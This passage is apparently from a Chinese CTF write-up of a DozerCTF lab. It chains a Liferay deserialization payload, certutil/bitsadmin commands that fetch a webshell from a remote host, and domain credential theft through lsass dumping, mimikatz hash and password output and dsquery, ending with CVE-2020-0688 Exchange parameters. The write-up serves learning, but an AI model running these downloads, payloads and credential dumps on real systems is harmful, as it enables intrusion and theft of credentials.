+cmd=%7B%22%2Fexpandocolumn%2Fadd-column%22%3A%7B%7D%7D&amp;p_auth=o3lt8q1F&amp;formDate=1585270368703&amp;tableId=1&amp;name=2&amp;type=3&amp;defaultData%3Acom.mchange.v2.c3p0.WrapperConnectionPoolDataSource={&#34;userOverridesAsString&#34;:&#34;HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400064c6966457870740019687474703a2f2f35392e3131302e3135372e343a383530302f740003466f6f;&#34;}
+</code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>将<code>WrapperConnectionPoolDataSource=</code>后面的内容换成<code>marshalsec</code>生成的序列化内容
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200615100326.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200615100326.png, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200615100326.png 1.5x, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200615100326.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/QQ图片20200615100326.png"
+        title="https://gitee.com/leonsec/images/raw/master/QQ图片20200615100326.png" />
+成功弹出计算器，(计算器也很无奈)</li>
+</ul>
+<h2 id="利用certutil进行远程下载webshell">利用certutil进行远程下载webshell</h2>
+<ul>
+<li>certutil和bitsadmin都可以进行远程http请求，本地用：</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bat" data-lang="bat">certutil.exe -urlcache -split -f <span class="s2">&#34;http://ip:8500/leon.txt“ leon.txt</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200615102916.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200615102916.png, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200615102916.png 1.5x, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200615102916.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/QQ图片20200615102916.png"
+        title="https://gitee.com/leonsec/images/raw/master/QQ图片20200615102916.png" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bat" data-lang="bat">bitsadmin /rawreturn /transfer down &#39;http://ip:8500/leon.txt&#39; D:\leon.txt
+</code></pre></td></tr></table>
+</div>
+</div><p>都可以成功远程下载文件</p>
+<ul>
+<li>在<code>LifExp.java</code>中需要构造一下：</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bat" data-lang="bat">String[] cmd = {<span class="s2">&#34;cmd.exe&#34;</span>, <span class="s2">&#34;/c&#34;</span>, <span class="s2">&#34;certutil.exe -urlcache -split -f&#34;</span>, <span class="s2">&#34;http://ip:8500/cmdcmd.jsp&#34;</span>, <span class="s2">&#34;..\\webapps\\ROOT\\cmdcmd.jsp&#34;</span>};
+</code></pre></td></tr></table>
+</div>
+</div><p>cmdcmd.jsp是webshell，经过本地测试执行命令的当前路径在<code>liferay-ce-portal-7.2.0-ga1\tomcat-9.0.17\bin</code>
+所以需要目录穿越到index.jsp的文件夹，（这里智障了，以为java不能直接访问到没有进行目录映射的jsp，就一直没写文件到这个目录）</p>
+<ul>
+<li>然后一样的步骤，生成class文件，post包发过去，就成功在index.jsp目录写入了webshell，蚁剑直接连接即可（有些webshell蚁剑不能连）
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200615104110.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200615104110.png, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200615104110.png 1.5x, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200615104110.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/QQ图片20200615104110.png"
+        title="https://gitee.com/leonsec/images/raw/master/QQ图片20200615104110.png" /></li>
+</ul>
+<p>flag在桌面<code>C:/Users/root/Desktop/flag.txt</code>
+<code>Dozerctf{a993e8ce377e05b2cbfa460e43e43757}</code></p>
+<ul>
+<li>方便后续操作可以写个jsp反弹shell
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200615104723.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200615104723.png, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200615104723.png 1.5x, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200615104723.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/QQ图片20200615104723.png"
+        title="https://gitee.com/leonsec/images/raw/master/QQ图片20200615104723.png" /></li>
+</ul>
+<h1 id="简单域渗透-flag2">简单域渗透-flag2</h1>
+<h2 id="先进行简单信息收集列出域信任关系">先进行简单信息收集，列出域信任关系：</h2>
+<p><code>nltest /domain_trusts</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200616164210.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200616164210.png, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200616164210.png 1.5x, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200616164210.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/QQ图片20200616164210.png"
+        title="https://gitee.com/leonsec/images/raw/master/QQ图片20200616164210.png" />
+环境为单域,查看ip信息,一般dns服务器就是dc:
+<code>ipconfig /all</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">C:\Users\root&gt;ipconfig /all
+
+Windows IP ����
+
+   ������  . . . . . . . . . . . . . : Dozer-dmz01
+   �� DNS ��׺ . . . . . . . . . . . : dozer.org
+   �ڵ�����  . . . . . . . . . . . . : ���
+   IP ·�������� . . . . . . . . . . : ��
+   WINS ���������� . . . . . . . . . : ��
+   DNS ��׺�����б�  . . . . . . . . : dozer.org
+
+��̫�������� Ethernet0:
+
+   �����ض��� DNS ��׺ . . . . . . . : 
+   ����. . . . . . . . . . . . . . . : Intel(R) 82574L ǧ����������
+   �����ַ. . . . . . . . . . . . . : 00-0C-29-20-FC-D5
+   DHCP ������ . . . . . . . . . . . : ��
+   �Զ�����������. . . . . . . . . . : ��
+   �������� IPv6 ��ַ. . . . . . . . : fe80::956d:4a99:42e5:44e6%12(��ѡ) 
+   IPv4 ��ַ . . . . . . . . . . . . : 10.10.10.2(��ѡ) 
+   ��������  . . . . . . . . . . . . : 255.255.255.0
+   Ĭ������. . . . . . . . . . . . . : 
+   DHCPv6 IAID . . . . . . . . . . . : 251661353
+   DHCPv6 �ͻ��� DUID  . . . . . . . : 00-01-00-01-26-49-C3-BF-00-0C-29-20-FC-D5
+   DNS ������  . . . . . . . . . . . : 10.10.10.3
+   TCPIP �ϵ� NetBIOS  . . . . . . . : ������
+
+��̫�������� Ethernet1:
+
+   �����ض��� DNS ��׺ . . . . . . . : 
+   ����. . . . . . . . . . . . . . . : Intel(R) 82574L ǧ���������� #2
+   �����ַ. . . . . . . . . . . . . : 00-0C-29-20-FC-DF
+   DHCP ������ . . . . . . . . . . . : ��
+   �Զ�����������. . . . . . . . . . : ��
+   �������� IPv6 ��ַ. . . . . . . . : fe80::d543:1779:2299:609%15(��ѡ) 
+   IPv4 ��ַ . . . . . . . . . . . . : 192.168.150.73(��ѡ) 
+   ��������  . . . . . . . . . . . . : 255.255.255.0
+   �����Լ��ʱ��  . . . . . . . . . : 2020��6��14�� 23:42:47
+   ��Լ���ڵ�ʱ��  . . . . . . . . . : 2020��6��17�� 23:42:54
+   Ĭ������. . . . . . . . . . . . . : 192.168.150.200
+   DHCP ������ . . . . . . . . . . . : 192.168.150.200
+   DHCPv6 IAID . . . . . . . . . . . : 352324649
+   DHCPv6 �ͻ��� DUID  . . . . . . . : 00-01-00-01-26-49-C3-BF-00-0C-29-20-FC-D5
+   DNS ������  . . . . . . . . . . . : 192.168.150.200
+   TCPIP �ϵ� NetBIOS  . . . . . . . : ������
+
+��������� isatap.{CFE9BA1B-E288-4FFB-9749-199C2D5515CE}:
+
+   ý��״̬  . . . . . . . . . . . . : ý���ѶϿ�
+   �����ض��� DNS ��׺ . . . . . . . : 
+   ����. . . . . . . . . . . . . . . : Microsoft ISATAP Adapter #2
+   �����ַ. . . . . . . . . . . . . : 00-00-00-00-00-00-00-E0
+   DHCP ������ . . . . . . . . . . . : ��
+   �Զ�����������. . . . . . . . . . : ��
+
+��������� isatap.{2D498A64-8D75-4BA5-964D-611E32EF20B3}:
+
+   �����ض��� DNS ��׺ . . . . . . . : 
+   ����. . . . . . . . . . . . . . . : Microsoft ISATAP Adapter #4
+   �����ַ. . . . . . . . . . . . . : 00-00-00-00-00-00-00-E0
+   DHCP ������ . . . . . . . . . . . : ��
+   �Զ�����������. . . . . . . . . . : ��
+   �������� IPv6 ��ַ. . . . . . . . : fe80::5efe:192.168.150.73%17(��ѡ) 
+   Ĭ������. . . . . . . . . . . . . : 
+   DNS ������  . . . . . . . . . . . : 192.168.150.200
+   TCPIP �ϵ� NetBIOS  . . . . . . . : �ѽ���
+
+</code></pre></td></tr></table>
+</div>
+</div><p>可以看到几个两个网段，根据经验，一个<code>192.168.150.x</code>应该是宿主机所在ip段，不用管，所以另外的<code>10.10.10.x</code>段应该是虚拟机内部网段
+<code>10.10.10.2</code>是本机，所以一般DNS服务器<code>10.10.10.3</code>就是DC</p>
+<h2 id="获取本机hash">获取本机hash</h2>
+<p>先下载<a href="https://github.com/gentilkiwi/mimikatz/releases" target="_blank" rel="noopener noreffer">mimikatz</a>
+<code>reg save hklm\sam sam</code>
+<code>reg save hklm\system system</code>
+然后下载到本地使用mimikatz：
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200616182726.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200616182726.png, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200616182726.png 1.5x, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200616182726.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/QQ图片20200616182726.png"
+        title="https://gitee.com/leonsec/images/raw/master/QQ图片20200616182726.png" />
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200616182759.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200616182759.png, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200616182759.png 1.5x, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200616182759.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/QQ图片20200616182759.png"
+        title="https://gitee.com/leonsec/images/raw/master/QQ图片20200616182759.png" />
+得到root也就是当前用户密码：<code>P@ssw0rd</code></p>
+<ul>
+<li>直接尝试<code>netstat -na</code>发现3389端口开启，尝试用root用户登录
+首先得进行内网代理，使用<code>reGeorg</code>即可
+登录成功：
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200616183757.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200616183757.png, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200616183757.png 1.5x, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200616183757.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/QQ图片20200616183757.png"
+        title="https://gitee.com/leonsec/images/raw/master/QQ图片20200616183757.png" /></li>
+</ul>
+<h2 id="转储内存抓域凭证">转储内存抓域凭证:</h2>
+<p>根据提示使用使用微软官方<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump" title="procdump.exe" target="_blank" rel="noopener noreffer">procdump.exe</a> dump内存：
+直接使用<code>certutil.exe -urlcache -split -f &quot;http://ip:8500/procdump64.exe“ procdump64.exe</code>即可
+然后<code>procdump64.exe -accepteula -ma lsass.exe lsass.dmp</code>
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200616190445.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200616190445.png, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200616190445.png 1.5x, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200616190445.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/QQ图片20200616190445.png"
+        title="https://gitee.com/leonsec/images/raw/master/QQ图片20200616190445.png" />
+然后执行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span><span class="lnt">91
+</span><span class="lnt">92
+</span><span class="lnt">93
+</span><span class="lnt">94
+</span><span class="lnt">95
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bat" data-lang="bat">mimikatz # sekurlsa::minidump lsass.dmp
+Switch to MINIDUMP : &#39;lsass.dmp&#39;
+
+mimikatz # sekurlsa::logonPasswords full
+Opening : &#39;lsass.dmp&#39; file for minidump...
+
+Authentication Id : 0 ; 78250732 (00000000:04aa02ec)
+Session           : RemoteInteractive from 5
+User Name         : root
+Domain            : DOZER-DMZ01
+Logon Server      : DOZER-DMZ01
+Logon Time        : 2020/6/16 12:47:35
+SID               : S-1-5-21-1495210691-4001662545-2502461571-1001
+        msv :
+         [00000003] Primary
+         * Username : root
+         * Domain   : DOZER-DMZ01
+         * LM       : 921988ba001dc8e14a3b108f3fa6cb6d
+         * NTLM     : e19ccf75ee54e06b06a5907af13cef42
+         * SHA1     : 9131834cf4378828626b1beccaa5dea2c46f9b63
+        tspkg :
+         * Username : root
+         * Domain   : DOZER-DMZ01
+         * Password : P@ssw0rd
+        wdigest :
+         * Username : root
+         * Domain   : DOZER-DMZ01
+         * Password : P@ssw0rd
+        kerberos :
+         * Username : root
+         * Domain   : DOZER-DMZ01
+         * Password : P@ssw0rd
+        ssp :
+        credman :
+         [00000000]
+         * Username : dozer\shark
+         * Domain   : dozer-dc.dozer.org
+         * Password : P@ssword
+
+Authentication Id : 0 ; 78236002 (00000000:04a9c962)
+Session           : Interactive from 5
+User Name         : DWM-5
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2020/6/16 12:47:32
+SID               : S-1-5-90-5
+        msv :
+         [00000003] Primary
+         * Username : DOZER-DMZ01$
+         * Domain   : DOZER
+         * NTLM     : 0aede09a6722cd9c04eb892f5af27068
+         * SHA1     : e668a6f212e2c5c8780685436732bb3d64a4e7f0
+        tspkg :
+         * Username : DOZER-DMZ01$
+         * Domain   : DOZER
+         * Password : eJ,e!-IVYX_2h %jR+pHL(vNi4kj=PqFY ywV-KX7l=`&#39;oL<span class="se">^-</span>S&#39;h(6q+CzlU0F=<span class="p">&gt;</span>#)+OQ-wzUsk.;ciPQVa!Gtv<span class="s2">&#34;]oCNt&#34;</span>dJba<span class="p">&lt;</span>L6D2VT.\e8bhFd<span class="se">^O</span>@O$+i
+        wdigest :
+         * Username : DOZER-DMZ01$
+         * Domain   : DOZER
+         * Password : eJ,e!-IVYX_2h %jR+pHL(vNi4kj=PqFY ywV-KX7l=`&#39;oL<span class="se">^-</span>S&#39;h(6q+CzlU0F=<span class="p">&gt;</span>#)+OQ-wzUsk.;ciPQVa!Gtv<span class="s2">&#34;]oCNt&#34;</span>dJba<span class="p">&lt;</span>L6D2VT.\e8bhFd<span class="se">^O</span>@O$+i
+        kerberos :
+         * Username : DOZER-DMZ01$
+         * Domain   : dozer.org
+         * Password : eJ,e!-IVYX_2h %jR+pHL(vNi4kj=PqFY ywV-KX7l=`&#39;oL<span class="se">^-</span>S&#39;h(6q+CzlU0F=<span class="p">&gt;</span>#)+OQ-wzUsk.;ciPQVa!Gtv<span class="s2">&#34;]oCNt&#34;</span>dJba<span class="p">&lt;</span>L6D2VT.\e8bhFd<span class="se">^O</span>@O$+i
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 77940254 (00000000:04a5461e)
+Session           : Interactive from 0
+User Name         : shark
+Domain            : DOZER
+Logon Server      : DOZER-DC
+Logon Time        : 2020/6/16 12:45:28
+SID               : S-1-5-21-341825-3789073605-4250195040-1109
+        msv :
+         [00000003] Primary
+         * Username : shark
+         * Domain   : DOZER
+         * LM       : 921988ba001dc8e14a3b108f3fa6cb6d
+         * NTLM     : e19ccf75ee54e06b06a5907af13cef42
+         * SHA1     : 9131834cf4378828626b1beccaa5dea2c46f9b63
+        tspkg :
+         * Username : shark
+         * Domain   : DOZER
+         * Password : P@ssw0rd
+        wdigest :
+         * Username : shark
+         * Domain   : DOZER
+         * Password : P@ssw0rd
+        kerberos :
+         * Username : shark
+         * Domain   : DOZER.ORG
+         * Password : P@ssw0rd
+        ssp :
+        credman :
+</code></pre></td></tr></table>
+</div>
+</div><p>发现<code>shark</code>用户的密码也是<code>P@ssw0rd</code>
+（其实可以直接操作这步拿root密码）</p>
+<h2 id="使用dsquery导出域信息">使用dsquery导出域信息</h2>
+<p><code>dsquery * /s 10.10.10.3 /u shark /p P@ssw0rd -attr * -limit 0 &gt; leon.txt</code>
+得到：<a href="http://blog.clq0.top/wp-content/uploads/2020/06/leon.txt" target="_blank" rel="noopener noreffer">leon</a>
+根据提示搜索找到flag2：<code>Dozerctf{3fed7db7fee7a1771b58d309bf9ca851}</code></p>
+<h1 id="简单域渗透-flag3">简单域渗透-flag3</h1>
+<p>根据提示和拿到的域信息，找到<code>EXCHANGE SERVERS</code>组：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">cn: DOZER-EXCHANGE
+distinguishedName: CN=DOZER-EXCHANGE,CN=Computers,DC=dozer,DC=org
+instanceType: 4
+whenCreated: 05/13/2020 15:06:52
+whenChanged: 06/13/2020 09:49:14
+displayName: DOZER-EXCHANGE$
+uSNCreated: 16419
+memberOf: CN=Exchange Install Domain Servers,CN=Microsoft Exchange System Objects,DC=dozer,DC=org
+memberOf: CN=Managed Availability Servers,OU=Microsoft Exchange Security Groups,DC=dozer,DC=org
+memberOf: CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=dozer,DC=org
+memberOf: CN=Exchange Servers,OU=Microsoft Exchange Security Groups,DC=dozer,DC=org
+uSNChanged: 71171
+name: DOZER-EXCHANGE
+objectGUID: {E650C9C8-43EC-4B65-BD74-657ECD951421}
+userAccountControl: 4096
+</code></pre></td></tr></table>
+</div>
+</div><p>得知提供<code>EXCHANGE</code>邮箱服务的机器名为<code>DOZER-EXCHANGE</code></p>
+<ul>
+<li>可以使用<code>ping</code>或者<code>nslookup</code>机器名得到ip：
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200616215141.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200616215141.png, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200616215141.png 1.5x, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200616215141.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/QQ图片20200616215141.png"
+        title="https://gitee.com/leonsec/images/raw/master/QQ图片20200616215141.png" />
+所以定位到<code>10.10.10.4</code>
+使用用户名<code>dozer\shark</code>，密码<code>P@ssw0rd</code>登录，拿到flag3：
+<code>Dozerctf{9b35c916c37b00f3359d49b6c9c99667}</code></li>
+</ul>
+<h1 id="简单域渗透-flag4">简单域渗透-flag4</h1>
+<p>根据<code>EXCHANGE</code>的漏洞，搜索找到<code>CVE-2020-0688</code></p>
+<blockquote>
+<p>参考：<a href="https://www.freebuf.com/vuls/228735.html" target="_blank" rel="noopener noreffer">CVE-2020-0688 exchange远程代码执行漏洞复现</a>
+<a href="https://www.freebuf.com/vuls/228681.html" target="_blank" rel="noopener noreffer">ExchangeServer漏洞CVE-2020-0688复现</a></p>
+</blockquote>
+<h2 id="简单复现">简单复现</h2>
+<p>我们需要四个参数：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">–validationkey = CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF（默认，漏洞产生原因）
+
+–validationalg = SHA1（默认，漏洞产生原因）
+
+–generator=B97B4E27（基本默认）
+
+–viewstateuserkey = ASP.NET_SessionId（手工获取，变量，每次登陆都不一致）
+</code></pre></td></tr></table>
+</div>
+</div><p>前两个值都是默认的，我们只需要找到后两个值即可</p>
+<h3 id="获取viewstateuserkey">获取viewstateuserkey</h3>
+<p>登录后访问 <code>/ecp/default.aspx</code>,<code>F12</code>打开开发者工具栏，打开<code>Network</code>：
+viewstateuserkey位于：<code>default.aspx–&gt;Headers–&gt;ASP.NET_SessionId</code>中：
+重新发送请求即可找到：
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200616223809.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200616223809.png, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200616223809.png 1.5x, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200616223809.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/QQ图片20200616223809.png"
+        title="https://gitee.com/leonsec/images/raw/master/QQ图片20200616223809.png" /></p>
+<h3 id="获取generator值">获取generator值</h3>
+<p>源码搜索__VIEWSTATEGENERATOR获取字段值：（这个值基本上也是相同的）
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200616223909.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200616223909.png, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200616223909.png 1.5x, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200616223909.png 2x"
+        data-sizes="auto"
